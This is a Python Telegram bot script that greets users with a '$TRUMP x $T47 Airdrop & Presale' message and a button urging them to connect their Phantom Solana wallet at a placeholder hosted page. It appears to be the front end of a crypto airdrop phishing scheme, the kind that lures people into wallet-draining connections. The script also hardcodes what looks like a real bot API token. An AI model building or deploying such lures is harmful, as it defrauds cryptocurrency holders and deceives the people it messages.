import logging
import asyncio
from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackContext

# ðŸ”¹ Bot API Token
BOT_TOKEN = "7708216067:AAF2Li2xV-2ZIF9dhpJsy4_LQGFIZhSmW5U"

# ðŸ”¹ Initialize bot
bot = Bot(token=BOT_TOKEN)

# ðŸ”¹ Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ðŸ”¹ Start Command â€“ Redirects User to Wallet Connection Page
async def start(update: Update, context: CallbackContext):
    # âœ… Replace this with your hosted Phantom connection page
    wallet_connect_url = "https://yourusername.github.io/connect.html"

    keyboard = [[InlineKeyboardButton("ðŸ”— Connect Solana Wallet", url=wallet_connect_url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "ðŸš€ *Welcome to the $TRUMP x $T47 Airdrop & Presale!* ðŸš€\n\n"
        "ðŸ’Ž Click below to securely connect your Phantom Wallet & verify your wallet address.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ðŸ”¹ Bot Setup
def setup_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    return application

# ðŸ”¹ Run the bot
if __name__ == "__main__":
    logger.info("âœ… Wallet Connection Bot Started!")
    loop = asyncio.get_event_loop()
    application = setup_bot()
    loop.create_task(application.run_polling())
    loop.run_forever()
